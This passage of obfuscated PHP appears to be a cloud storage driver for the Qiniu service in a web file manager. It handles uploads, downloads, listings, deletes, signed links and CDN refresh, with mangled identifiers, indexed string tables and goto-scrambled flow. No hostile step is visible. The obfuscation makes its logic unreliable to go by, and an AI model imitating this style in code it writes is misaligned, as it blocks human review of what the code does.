} $fõ‡¥éÙõ° = IO::init(self::defaultIO()); return $fõ‡¥éÙõ°; } public static function fileTypeList() { $E¿÷‚ÍöŒ‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d­¼õ’¨Â = $GLOBALS[$E¿÷‚ÍöŒ‡[6]][$E¿÷‚ÍöŒ‡[1088]]; foreach ($d­¼õ’¨Â as $B¨¶‚î½Ì¡ => $D½ÜÊÜ¶Ü) { $f»ø¼†¯‰ = $E¿÷‚ÍöŒ‡[1089] . $B¨¶‚î½Ì¡; $e•™ƒùË„® = LNG($f»ø¼†¯‰); if ($f»ø¼†¯‰ != $e•™ƒùË„®) { $d­¼õ’¨Â[$B¨¶‚î½Ì¡][$E¿÷‚ÍöŒ‡[28]] = $e•™ƒùË„®; } } return $d­¼õ’¨Â; } public static function transferType($f¡ùÈç½ÈÁ, $fà˜‹Öæ½Ã) { goto Aõ‘Ú¨ˆ‘; FõÜœ”ò‰…: return $aé•”ñ…ì[1092]; goto AÎ¾óÑ÷³; Aõ‘Ú¨ˆ‘: $aé•”ñ…ì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¨±ÃšÜ¾­ = self::driverType($f¡ùÈç½ÈÁ); $b²–“Ï‰£Š = self::driverType($fà˜‹Öæ½Ã); goto BÏœÉ¿ÙµÈ; BÏœÉ¿ÙµÈ: if ($f¨±ÃšÜ¾­[$aé•”ñ…ì[29]] == $b²–“Ï‰£Š[$aé•”ñ…ì[29]] && $f¨±ÃšÜ¾­[$aé•”ñ…ì[1090]] == $b²–“Ï‰£Š[$aé•”ñ…ì[1090]]) { return $aé•”ñ…ì[1091]; } if ($f¨±ÃšÜ¾­[$aé•”ñ…ì[29]] == $aé•”ñ…ì[781] && $b²–“Ï‰£Š[$aé•”ñ…ì[29]] == $aé•”ñ…ì[102]) { return $aé•”ñ…ì[1037]; } if ($f¨±ÃšÜ¾­[$aé•”ñ…ì[29]] == $aé•”ñ…ì[102] && $b²–“Ï‰£Š[$aé•”ñ…ì[29]] == $aé•”ñ…ì[781]) { return $aé•”ñ…ì[103]; } goto FõÜœ”ò‰…; AÎ¾óÑ÷³: } public static function driverType($bÙğ±šÉì) { goto dí¹—¹¢¨Ä; dí¹—¹¢¨Ä: $cƒÃÒÓÔ­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dŒ‰İŠÔğ¶ = $bÙğ±šÉì->path; $fºŸŠÜŠÁ£ = str_replace($cƒÃÒÓÔ­[1093], $cƒÃÒÓÔ­[33], strtolower($bÙğ±šÉì->getType())); goto CêåİŒˆ¯; CêåİŒˆ¯: if ($fºŸŠÜŠÁ£ == $cƒÃÒÓÔ­[688] || $fºŸŠÜŠÁ£ == $cƒÃÒÓÔ­[1094] || $fºŸŠÜŠÁ£ == $cƒÃÒÓÔ­[1095]) { $bÙğ±šÉì = self::defaultDriverInit(); } else { if ($fºŸŠÜŠÁ£ == $cƒÃÒÓÔ­[1045] || $fºŸŠÜŠÁ£ == $cƒÃÒÓÔ­[1096]) { $bÙğ±šÉì = IO::init($bÙğ±šÉì->pathParse[$cƒÃÒÓÔ­[995]]); } } $fºŸŠÜŠÁ£ = str_replace($cƒÃÒÓÔ­[1093], $cƒÃÒÓÔ­[33], strtolower($bÙğ±šÉì->getType())); if ($fºŸŠÜŠÁ£ == $cƒÃÒÓÔ­[102]) { return array($cƒÃÒÓÔ­[29] => $cƒÃÒÓÔ­[102], $cƒÃÒÓÔ­[1090] => $cƒÃÒÓÔ­[33], $cƒÃÒÓÔ­[75] => $dŒ‰İŠÔğ¶); } goto A Á§óêŠá; A Á§óêŠá: return array($cƒÃÒÓÔ­[29] => $cƒÃÒÓÔ­[781], $cƒÃÒÓÔ­[1090] => $bÙğ±šÉì->pathDriver, $cƒÃÒÓÔ­[75] => $dŒ‰İŠÔğ¶); goto e‹Å¦£ğÍá; e‹Å¦£ğÍá: } } goto DŠÎØÜ«¦; Bã«Ø¨„: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($eğÃÁÜïÑ—) { parent::__construct(); require_once SDK_DIR . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1211]; $this->_init($eğÃÁÜïÑ—); } public function _init($fğÚïªèè) { foreach ($fğÚïªèè as $C¾êà¼¬Ä£ => $BÍ²ÒïñÈ½) { if (isset($this->{$C¾êà¼¬Ä£})) { $this->{$C¾êà¼¬Ä£} = $BÍ²ÒïñÈ½; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1212], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($bœ¡îŒêòà, $d¦ÛçÒŒ¶ = '', $Bç›¾¤ó™ = REPEAT_RENAME) { if ($this->setContent($bœ¡îŒêòà, $d¦ÛçÒŒ¶)) { return $this->getPathOuter($bœ¡îŒêòà); } return !1; } public function mkdir($f·ÈÂï×ŒÀ, $aİğã³²ÚÎ = REPEAT_SKIP) { goto bô§¢ß¤—‹; bô§¢ß¤—‹: $e™…µóŒ‹– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FÀ‚ù¸†˜Í = trim($f·ÈÂï×ŒÀ, $e™…µóŒ‹–[8]); if ($this->_isFolder($FÀ‚ù¸†˜Í)) { return $this->getPathOuter($FÀ‚ù¸†˜Í); } goto FÎçÆ¿İÔ; FÎçÆ¿İÔ: $f·ÈÂï×ŒÀ = $FÀ‚ù¸†˜Í . $e™…µóŒ‹–[8]; $BÕôñíÅòæ = get_path_this($FÀ‚ù¸†˜Í); $bÓ÷­÷…¼ˆ = $f·ÈÂï×ŒÀ . $BÕôñíÅòæ; goto FãœÍ­Ùè“; FãœÍ­Ùè“: if (!$this->mkfile($bÓ÷­÷…¼ˆ)) { return !1; } if (!$this->moveFile($bÓ÷­÷…¼ˆ, $f·ÈÂï×ŒÀ)) { $this->delFile($bÓ÷­÷…¼ˆ); return !1; } return $this->getPathOuter($FÀ‚ù¸†˜Í); goto A¨ØŠíÑŒ; A¨ØŠíÑŒ: } public function copyFile($d—ÉèÔœ¨, $d¹¤Ì×Â÷Ô) { $FË¶œõ™í = $this->bucketManager->copy($this->bucket, $d—ÉèÔœ¨, $this->bucket, $d¹¤Ì×Â÷Ô, !0); return $FË¶œõ™í ? !1 : $this->getPathOuter($d¹¤Ì×Â÷Ô); } public function moveFile($a¢Õˆ·ì—, $cÖÂ›àŠ‚) { $C¿ñ¶‘£®‡ = $this->bucketManager->move($this->bucket, $a¢Õˆ·ì—, $this->bucket, $cÖÂ›àŠ‚, !0); return $C¿ñ¶‘£®‡ ? !1 : $this->getPathOuter($cÖÂ›àŠ‚); } public function delFile($Fˆèù‡øç´) { $Bëò¥”Óš = $this->bucketManager->delete($this->bucket, $Fˆèù‡øç´); return $Bëò¥”Óš ? !1 : !0; } public function delFolder($d²‘¼¤½˜…) { $EĞ¦‰§ªŒŒ = $this->fileList($d²‘¼¤½˜…); if (empty($EĞ¦‰§ªŒŒ)) { return !0; } $AÊ¿ïîªÅÔ = 1000; if (count($EĞ¦‰§ªŒŒ) <= $AÊ¿ïîªÅÔ) { return $this->qnDelObj($EĞ¦‰§ªŒŒ) ? !1 : !0; } foreach (array_chunk($EĞ¦‰§ªŒŒ, $AÊ¿ïîªÅÔ) as $fŞÍÒ‹™) { $BÏˆ¦§¡ = $this->qnDelObj($fŞÍÒ‹™); if ($BÏˆ¦§¡) { return !1; } } return !0; } private function qnDelObj($dèëğ‘Š·£) { $Eº†µÑÊ›î = $this->bucketManager->buildBatchDelete($this->bucket, $dèëğ‘Š·£); list($cÒÔ®«À, $bë£ËÙ®§«) = $this->bucketManager->batch($Eº†µÑÊ›î); return $bë£ËÙ®§«; } private function fileList($d†ÖÉç­Ù, $B‚×¸ˆèªš = 0) { goto a…·ç¢Šô¶; b•ËŠö›Š‡: $C›®„ÑÜ  = $cÅµå–ªÂî[33]; $BÆñÕò‹Ç« = 1000; $DøŸ¸ÙŸ = $cÅµå–ªÂî[33]; goto D‹æ…ô¹à¼; a…·ç¢Šô¶: $cÅµå–ªÂî =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d†ÖÉç­Ù = trim($d†ÖÉç­Ù, $cÅµå–ªÂî[8]); $CñáÈªÈƒ× = empty($d†ÖÉç­Ù) ? $cÅµå–ªÂî[33] : $d†ÖÉç­Ù . $cÅµå–ªÂî[8]; goto b•ËŠö›Š‡; D‹æ…ô¹à¼: $F‰‡¤¯°É‹ = array(); while (!0) { list($eÈíáŸƒÑ, $Eï±…¢Áù—) = $this->bucketManager->listFiles($this->bucket, $CñáÈªÈƒ×, $C›®„ÑÜ , $BÆñÕò‹Ç«, $DøŸ¸ÙŸ); if ($Eï±…¢Áù—) { return !1; } $C›®„ÑÜ  = array_key_exists($cÅµå–ªÂî[1182], $eÈíáŸƒÑ) ? $C›®„ÑÜ  = $eÈíáŸƒÑ[$cÅµå–ªÂî[1213]] : $cÅµå–ªÂî[33]; foreach ($eÈíáŸƒÑ[$cÅµå–ªÂî[1214]] as $fíÏ’•ÉÁ½) { $D§ì…Â„ªĞ = $fíÏ’•ÉÁ½[$cÅµå–ªÂî[89]]; if ($B‚×¸ˆèªš) { $D§ì…Â„ªĞ = array($cÅµå–ªÂî[28] => $D§ì…Â„ªĞ, $cÅµå–ªÂî[77] => $fíÏ’•ÉÁ½[$cÅµå–ªÂî[1215]]); } $F‰‡¤¯°É‹[] = $D§ì…Â„ªĞ; } if ($C›®„ÑÜ  == $cÅµå–ªÂî[33]) { break; } } return $F‰‡¤¯°É‹; goto A¯ìØ›÷Â; A¯ìØ›÷Â: } public function rename($bº¾Íµ´çĞ, $eŠ´‰ñ©Ñâ) { return $this->renameObject($bº¾Íµ´çĞ, $eŠ´‰ñ©Ñâ); } public function fileInfo($Dñ×¾˜âİ, $A© ‡¦» = false, $d×¦ë÷Ê¡š = array()) { goto eÔ¼ÊÌñ­Š; F‡ø¦¢¿„: if (empty($d×¦ë÷Ê¡š)) { $d×¦ë÷Ê¡š = $this->objectMeta($Dñ×¾˜âİ); if (!$d×¦ë÷Ê¡š) { return $a»«ßãë¹ğ; } } if (isset($d×¦ë÷Ê¡š[$e¦ŠÍïæº»[1216]])) { $a»«ßãë¹ğ[$e¦ŠÍïæº»[107]] = substr($d×¦ë÷Ê¡š[$e¦ŠÍïæº»[1216]] . $e¦ŠÍïæº»[33], 0, 10); } if (isset($d×¦ë÷Ê¡š[$e¦ŠÍïæº»[1215]])) { $a»«ßãë¹ğ[$e¦ŠÍïæº»[77]] = $d×¦ë÷Ê¡š[$e¦ŠÍïæº»[1215]]; } goto bĞ„Ç¹; bĞ„Ç¹: return $a»«ßãë¹ğ; goto c¥Óè éóÏ; eÔ¼ÊÌñ­Š: $e¦ŠÍïæº» =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($A© ‡¦») { return array($e¦ŠÍïæº»[28] => $this->pathThis($Dñ×¾˜âİ), $e¦ŠÍïæº»[75] => $this->getPathOuter($e¦ŠÍïæº»[8] . $Dñ×¾˜âİ), $e¦ŠÍïæº»[29] => $e¦ŠÍïæº»[167], $e¦ŠÍïæº»[77] => isset($d×¦ë÷Ê¡š[$e¦ŠÍïæº»[1215]]) ? $d×¦ë÷Ê¡š[$e¦ŠÍïæº»[1215]] : 0, $e¦ŠÍïæº»[160] => $this->ext($Dñ×¾˜âİ)); } $a»«ßãë¹ğ = array($e¦ŠÍïæº»[28] => $this->pathThis($Dñ×¾˜âİ), $e¦ŠÍïæº»[75] => $this->getPathOuter($e¦ŠÍïæº»[8] . $Dñ×¾˜âİ), $e¦ŠÍïæº»[29] => $e¦ŠÍïæº»[167], $e¦ŠÍïæº»[187] => 0, $e¦ŠÍïæº»[107] => 0, $e¦ŠÍïæº»[77] => 0, $e¦ŠÍïæº»[160] => $this->ext($Dñ×¾˜âİ), $e¦ŠÍïæº»[188] => !0, $e¦ŠÍïæº»[189] => !0); goto F‡ø¦¢¿„; c¥Óè éóÏ: } public function folderInfo($EÍ‹µñŞÄ, $D¦Ú÷´®ŒÁ = false) { goto AÂéÌ—¤Ëœ; Bèà±ÖªĞ¤: return $AŒƒ¯Š†“Ã; goto Dù§öì¸Ÿœ; e•ôƒêĞ©ß: $EÍ‹µñŞÄ = rtrim($EÍ‹µñŞÄ, $a»¼ƒ™ë¬Î[8]) . $a»¼ƒ™ë¬Î[8]; $cèÁ½ìÜ = $this->objectMeta($EÍ‹µñŞÄ); if (isset($cèÁ½ìÜ[$a»¼ƒ™ë¬Î[1216]])) { $AŒƒ¯Š†“Ã[$a»¼ƒ™ë¬Î[107]] = substr($cèÁ½ìÜ[$a»¼ƒ™ë¬Î[1216]] . $a»¼ƒ™ë¬Î[33], 0, 10); } goto Bèà±ÖªĞ¤; AÂéÌ—¤Ëœ: $a»¼ƒ™ë¬Î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($D¦Ú÷´®ŒÁ) { return array($a»¼ƒ™ë¬Î[28] => $this->pathThis($EÍ‹µñŞÄ), $a»¼ƒ™ë¬Î[75] => $this->getPathOuter($a»¼ƒ™ë¬Î[8] . $EÍ‹µñŞÄ), $a»¼ƒ™ë¬Î[29] => $a»¼ƒ™ë¬Î[76]); } $AŒƒ¯Š†“Ã = array($a»¼ƒ™ë¬Î[28] => $this->pathThis($EÍ‹µñŞÄ), $a»¼ƒ™ë¬Î[75] => $this->getPathOuter($a»¼ƒ™ë¬Î[8] . $EÍ‹µñŞÄ), $a»¼ƒ™ë¬Î[29] => $a»¼ƒ™ë¬Î[76], $a»¼ƒ™ë¬Î[187] => 0, $a»¼ƒ™ë¬Î[107] => 0, $a»¼ƒ™ë¬Î[1161] => !0, $a»¼ƒ™ë¬Î[1162] => !0); goto e•ôƒêĞ©ß; Dù§öì¸Ÿœ: } public function listPath($Bå„¾·†Ö±, $d©ªÀƒÍé¦ = false) { goto bÆ¿¥‚Ùôœ; bÆ¿¥‚Ùôœ: $dÂ‹˜†‘ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bå„¾·†Ö± = trim($Bå„¾·†Ö±, $dÂ‹˜†‘ò[8]); $C—„Ğ–Ø Ë = empty($Bå„¾·†Ö±) ? $dÂ‹˜†‘ò[33] : $Bå„¾·†Ö± . $dÂ‹˜†‘ò[8]; goto aÎèªÛ—¤Ö; aÎèªÛ—¤Ö: $F„îø—Â = $dÂ‹˜†‘ò[33]; $BñâÄñ³í¥ = 1000; $c¢»Æ¨õ§ = $dÂ‹˜†‘ò[8]; goto eğ¢¡¤”Üã; eğ¢¡¤”Üã: $f¢½ÊÁÌ¥£ = $CïáìäÒƒå = array(); while (!0) { list($a¶±ÎˆØãô, $E®Ğ…ò»ƒ) = $this->bucketManager->listFiles($this->bucket, $C—„Ğ–Ø Ë, $F„îø—Â, $BñâÄñ³í¥, $c¢»Æ¨õ§); if ($E®Ğ…ò»ƒ) { return !1; } $F„îø—Â = array_key_exists($dÂ‹˜†‘ò[1182], $a¶±ÎˆØãô) ? $F„îø—Â = $a¶±ÎˆØãô[$dÂ‹˜†‘ò[1213]] : $dÂ‹˜†‘ò[33]; if (isset($a¶±ÎˆØãô[$dÂ‹˜†‘ò[1217]])) { foreach ($a¶±ÎˆØãô[$dÂ‹˜†‘ò[1217]] as $eğÄÒšÏø ) { if ($eğÄÒšÏø  == $C—„Ğ–Ø Ë) { continue; } $f¢½ÊÁÌ¥£[] = $this->folderInfo($eğÄÒšÏø , $d©ªÀƒÍé¦); } } if (isset($a¶±ÎˆØãô[$dÂ‹˜†‘ò[1214]])) { foreach ($a¶±ÎˆØãô[$dÂ‹˜†‘ò[1214]] as $BÍÎ«Î„µ˜) { if ($BÍÎ«Î„µ˜[$dÂ‹˜†‘ò[89]] == $C—„Ğ–Ø Ë) { continue; } $CïáìäÒƒå[] = $this->fileInfo($BÍÎ«Î„µ˜[$dÂ‹˜†‘ò[89]], $d©ªÀƒÍé¦, $BÍÎ«Î„µ˜); } } if ($F„îø—Â == $dÂ‹˜†‘ò[33]) { break; } } return array($dÂ‹˜†‘ò[74] => $f¢½ÊÁÌ¥£, $dÂ‹˜†‘ò[73] => $CïáìäÒƒå); goto Cí£ê¤½ÔË; Cí£ê¤½ÔË: } public function has($cÈ¹÷ˆ†æ½, $Aí­åŒÊõ¯ = false, $Bã™ñë„ìß = true) { goto d™ÂÀ²Ì¶; d™ÂÀ²Ì¶: $BìÇ©ÁÑî =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÈ¹÷ˆ†æ½ = trim($cÈ¹÷ˆ†æ½, $BìÇ©ÁÑî[8]); $DÅÆÇÃ›Ó  = empty($cÈ¹÷ˆ†æ½) ? $BìÇ©ÁÑî[33] : $cÈ¹÷ˆ†æ½ . $BìÇ©ÁÑî[8]; goto aç¿Ï¯İéÑ; BŒ’óõ»Æª: if ($Aí­åŒÊõ¯) { return array($BìÇ©ÁÑî[191] => $FÉŸÖ„Ö‡¥, $BìÇ©ÁÑî[192] => $dñª÷šïÆ); } return !1; goto BÛğÚ¢ßÜ; aç¿Ï¯İéÑ: $c¶·¼™ß¶ö = $BìÇ©ÁÑî[33]; $FÚß¬¦‹¾Ä = 1000; $FØó¦·Ïğ = $BìÇ©ÁÑî[8]; goto d¿æ•ÔÇ°; d¿æ•ÔÇ°: $FÉŸÖ„Ö‡¥ = 0; $dñª÷šïÆ = 0; while (!0) { list($BØ¶ñÃò‘, $e”ù‰µ„†) = $this->bucketManager->listFiles($this->bucket, $DÅÆÇÃ›Ó , $c¶·¼™ß¶ö, $FÚß¬¦‹¾Ä, $FØó¦·Ïğ); if ($e”ù‰µ„†) { return !1; } $c¶·¼™ß¶ö = array_key_exists($BìÇ©ÁÑî[1182], $BØ¶ñÃò‘) ? $c¶·¼™ß¶ö = $BØ¶ñÃò‘[$BìÇ©ÁÑî[1213]] : $BìÇ©ÁÑî[33]; if ($Aí­åŒÊõ¯) { if (!empty($BØ¶ñÃò‘[$BìÇ©ÁÑî[1214]])) { $FÉŸÖ„Ö‡¥ += count($BØ¶ñÃò‘[$BìÇ©ÁÑî[1214]]); } if (!empty($BØ¶ñÃò‘[$BìÇ©ÁÑî[1217]])) { $dñª÷šïÆ += count($BØ¶ñÃò‘[$BìÇ©ÁÑî[1217]]); } if ($c¶·¼™ß¶ö === $BìÇ©ÁÑî[33]) { break; } continue; } if ($Bã™ñë„ìß) { if (!empty($BØ¶ñÃò‘[$BìÇ©ÁÑî[1214]])) { return !0; } } else { if (!empty($BØ¶ñÃò‘[$BìÇ©ÁÑî[1217]])) { return !0; } } if ($c¶·¼™ß¶ö == $BìÇ©ÁÑî[33]) { break; } } goto BŒ’óõ»Æª; BÛğÚ¢ßÜ: } public function listAll($fó•‡¿•ã‡) { $f¼‰ŸŞ¿«Ñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EªåØ³î = $this->fileList($fó•‡¿•ã‡, 1); $BåÆÎÓ˜ÉÖ = array(); foreach ($EªåØ³î as $CÜ‘Õªë¨Ó) { $BåÆÎÓ˜ÉÖ[$CÜ‘Õªë¨Ó[$f¼‰ŸŞ¿«Ñ[28]]] = $CÜ‘Õªë¨Ó[$f¼‰ŸŞ¿«Ñ[77]]; } return $this->listAllFiles($fó•‡¿•ã‡, array_keys($BåÆÎÓ˜ÉÖ), $BåÆÎÓ˜ÉÖ); } public function canRead($ağà¨îÙª) { return $this->exist($ağà¨îÙª) ? !0 : !1; } public function canWrite($aÉö ˜«¾•) { return $this->exist($aÉö ˜«¾•) ? !0 : !1; } public function getContent($B§åÏ­”Æà) { return $this->fileSubstr($B§åÏ­”Æà, 0, -1); } public function setContent($d÷ßñÁ, $eçùÚÈ¦‚ê = '') { $B´‚ä”ºÏÑ = $this->tempFile($this->pathThis($d÷ßñÁ)); file_put_contents($B´‚ä”ºÏÑ, $eçùÚÈ¦‚ê); if ($this->upload($d÷ßñÁ, $B´‚ä”ºÏÑ)) { $this->tempFileRemve($B´‚ä”ºÏÑ); return !0; } return !1; } public function refreshUrls($FŒèß†Èù) { goto FÔÔ¿…°ÒØ; FÔÔ¿…°ÒØ: $cèˆ‰¥ÜŸó =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bª‰Ôğæ = array(); if (is_array($FŒèß†Èù)) { foreach ($FŒèß†Èù as $aÍ§ŞŠ¸ÚŠ) { $bª‰Ôğæ[] = $this->link($aÍ§ŞŠ¸ÚŠ); } } else { $bª‰Ôğæ[] = $this->link($FŒèß†Èù); } goto a—•ïÙ¶á¬; e¢™÷Ûø: return $eƒµ¥‹ºê[$cèˆ‰¥ÜŸó[1218]] == $cèˆ‰¥ÜŸó[690] ? !0 : !1; goto eÊŒŞÓîÕÀ; a—•ïÙ¶á¬: $C”ŸÏœ®¨ = new Qiniu\Cdn\CdnManager($this->auth); list($eƒµ¥‹ºê, $b°†°ï¨ùÉ) = $C”ŸÏœ®¨->refreshUrls($bª‰Ôğæ); if ($b°†°ï¨ùÉ) { return !1; } goto e¢™÷Ûø; eÊŒŞÓîÕÀ: } public function fileSubstr($aˆÆ™¢Œæ—, $dÇï™§ñ‡Á, $DàğŠÔ‡Æ¥) { $FÇç­ˆ³½Ş =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!($eŠçóç„Åø = $this->link($aˆÆ™¢Œæ—))) { return !1; } $aö±†ßäÂ¶ = !1; if ($DàğŠÔ‡Æ¥ > 0) { $B³¿Ãò©­÷ = $dÇï™§ñ‡Á + $DàğŠÔ‡Æ¥ - 1; $aö±†ßäÂ¶ = array($FÇç­ˆ³½Ş[1219] . $dÇï™§ñ‡Á . $FÇç­ˆ³½Ş[412] . $B³¿Ãò©­÷); } $bØ…ÔåÚŞ = url_request($eŠçóç„Åø, $FÇç­ˆ³½Ş[216], !1, $aö±†ßäÂ¶); return $bØ…ÔåÚŞ[$FÇç­ˆ³½Ş[683]] ? $bØ…ÔåÚŞ[$FÇç­ˆ³½Ş[1031]] : !1; } public function upload($dÉïİÀ¯¢Ü, $bßÅëÜá¸Ö, $d¡ˆ„•çªí = false, $d«ó–Ò±‹Í = REPEAT_REPLACE) { $F¦³Ûö­… = new Qiniu\Storage\UploadManager(); $f ¬©„©Ú  = $this->auth->uploadToken($this->bucket, $dÉïİÀ¯¢Ü); $d²‰ôø¦ŒŠ = get_file_mime(get_path_ext($bßÅëÜá¸Ö)); list($BñÓß—¬, $d’ªàí£Øò) = $F¦³Ûö­…->putFile($f ¬©„©Ú , $dÉïİÀ¯¢Ü, $bßÅëÜá¸Ö, null, $d²‰ôø¦ŒŠ); return $d’ªàí£Øò ? !1 : $this->getPathOuter($dÉïİÀ¯¢Ü); } public function uploadFormData($F¢´„Ÿ±çÎ, $DØä„ºÂÂ‚ = 3600) { return $this->uploadToken($F¢´„Ÿ±çÎ, $DØä„ºÂÂ‚); } public function multiUploadFormData($a…¾òÀ’™ñ, $Cóƒê‚¢Á = 3600) { return $this->uploadToken($a…¾òÀ’™ñ, $Cóƒê‚¢Á); } private function uploadToken($dï¼åÜœÑ, $E³¹å†ÃÈµ = 3600) { goto CíœÉ×„Î; CíœÉ×„Î: $FÃ¢øğé‰… =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Døø³†Œ£÷ = $E³¹å†ÃÈµ; $b ËÓ†²Ö = array($FÃ¢øğé‰…[1220] => $FÃ¢øğé‰…[1221]); goto eª¢ó·¢Ó¾; eÜÂ†ê¡¶: $fò‚­Ç£ÃÁ = http_type() . "\72\x2f\57\165\160\154\157\141\x64{$f¶»éƒêŸ§}\56\x71\151\x6e\151\165\x70\56\143\157\155\57"; return array($FÃ¢øğé‰…[1223] => $bÜˆˆÔ±Ğ‘, $FÃ¢øğé‰…[1224] => $fò‚­Ç£ÃÁ); goto f°Ë‘åê‹¼; eª¢ó·¢Ó¾: $F˜¸ì‰ÛÉ = $dï¼åÜœÑ; $bÜˆˆÔ±Ğ‘ = $this->auth->uploadToken($this->bucket, $F˜¸ì‰ÛÉ, $Døø³†Œ£÷, $b ËÓ†²Ö, !0); $f¶»éƒêŸ§ = empty($this->region) || $this->region == $FÃ¢øğé‰…[1222] ? $FÃ¢øğé‰…[33] : $FÃ¢øğé‰…[412] . $this->region; goto eÜÂ†ê¡¶; f°Ë‘åê‹¼: } public function download($cÑëßŒ…, $CÏºåÅ…) { goto fµÙšª²«; BÄ•Ö¾¢î: fclose($fˆ¾›¬øì); return $CÏºåÅ…; goto c¬¿æ±œ¯ô; fµÙšª²«: $bÒ‰‹³Ï‡¦ = IO::getPathInner(IO::mkfile($CÏºåÅ…)); if (!($dæ‹è¼ãŸî = $this->link($cÑëßŒ…))) { return !1; } $F†³’î„Œ = 0; goto F”®ŒÉ‰çŠ; F”®ŒÉ‰çŠ: $CåøÇ·Ì²Å = 1024 * 200; $fˆ¾›¬øì = fopen($bÒ‰‹³Ï‡¦, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1225]); while (!0) { $CÁÌ©½»Ó = $this->fileSubstr($cÑëßŒ…, $F†³’î„Œ, $CåøÇ·Ì²Å); if ($CÁÌ©½»Ó === !1) { return !1; } fwrite($fˆ¾›¬øì, $CÁÌ©½»Ó); $F†³’î„Œ += $CåøÇ·Ì²Å; if (strlen($CÁÌ©½»Ó) < $CåøÇ·Ì²Å) { break; } } goto BÄ•Ö¾¢î; c¬¿æ±œ¯ô: } public function link($AÙŠÇÜÏÇñ, $E‰ÎÍà¼àˆ = '') { if (!$this->isFile($AÙŠÇÜÏÇñ)) { return !1; } $cÎİŞÀ‡êŸ = $this->getHost() . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][8] . $this->pathEncode($AÙŠÇÜÏÇñ) . $E‰ÎÍà¼àˆ; return $this->auth->privateDownloadUrl($cÎİŞÀ‡êŸ, 3600 * 12); } public function fileOut($bÚÑ†ïÄ¤Ğ, $a°Œ”ÍÀ’ˆ = false, $a™âÈÖ¯´ = false, $eé³¨»šÎÃ = '') { $CƒÇ”×°Û =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($bÚÑ†ïÄ¤Ğ, $a°Œ”ÍÀ’ˆ, $a™âÈÖ¯´, $eé³¨»šÎÃ); } if (!$a™âÈÖ¯´) { $a™âÈÖ¯´ = $this->pathThis($bÚÑ†ïÄ¤Ğ); } $a¾•ƒ¹°ä‰ = $a°Œ”ÍÀ’ˆ ? $CƒÇ”×°Û[1226] . rawurlencode($a™âÈÖ¯´) : $CƒÇ”×°Û[33]; $e®ìù¿Ÿ† = $this->link($bÚÑ†ïÄ¤Ğ, $a¾•ƒ¹°ä‰); $this->fileOutLink($e®ìù¿Ÿ†); } public function fileOutServer($f¸µ·¨Îº, $F¥ÙÛÎ…ÙÜ = false, $BÄ‹‚ÅÅ‹Ç = false, $EĞ¥‡Æ¥¡â = '') { parent::fileOut($f¸µ·¨Îº, $F¥ÙÛÎ…ÙÜ, $BÄ‹‚ÅÅ‹Ç, $EĞ¥‡Æ¥¡â); } public function fileOutImage($c„Û‘õŠÔª, $Aˆëµ™±ãÁ = 250) { $CæøºíõÇ = $this->link($c„Û‘õŠÔª, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1227] . $Aˆëµ™±ãÁ); $this->fileOutLink($CæøºíõÇ); } public function fileOutImageServer($föˆƒ›ÏìÄ, $AïÙ‚˜áÅ§ = 250) { parent::fileOutImage($föˆƒ›ÏìÄ, $AïÙ‚˜áÅ§); } public function hashMd5($a¬„ÉéÉ) { $D³§×ÀÅ¿­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÃŠ¸®Œ‡ = $this->objectMeta($a¬„ÉéÉ); return isset($aÃŠ¸®Œ‡[$D³§×ÀÅ¿­[196]]) ? $aÃŠ¸®Œ‡[$D³§×ÀÅ¿­[196]] : !1; $fÅ½…†°íµ = $this->link($a¬„ÉéÉ, $D³§×ÀÅ¿­[1228]); } public function size($fÆ—‚ÆÚ¿) { $Fñâë÷÷Ï¿ = $this->objectMeta($fÆ—‚ÆÚ¿); return $Fñâë÷÷Ï¿ ? $Fñâë÷÷Ï¿[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]] : 0; } public function info($C„·®Øç£•) { if ($this->isFolder($C„·®Øç£•)) { return $this->folderInfo($C„·®Øç£•); } else { if ($this->isFile($C„·®Øç£•)) { return $this->fileInfo($C„·®Øç£•); } } return !1; } public function exist($Cçµîóµ) { return $this->isFile($Cçµîóµ) || $this->isFolder($Cçµîóµ); } public function isFile($B‰Ô°¼º¾Ÿ) { return !$this->isFolder($B‰Ô°¼º¾Ÿ) && $this->objectMeta($B‰Ô°¼º¾Ÿ); } public function isFolder($BÕ‰ŞÃ¡Ù) { return $this->cacheMethod($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][223], $BÕ‰ŞÃ¡Ù); } protected function objectMeta($dš×ÄÛĞ¬õ) { return $this->cacheMethod($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][224], $dš×ÄÛĞ¬õ); } protected function _objectMeta($AôÊ¹¾ï«Œ) { $EÖ¦ØÁ¥ÖÖ =& 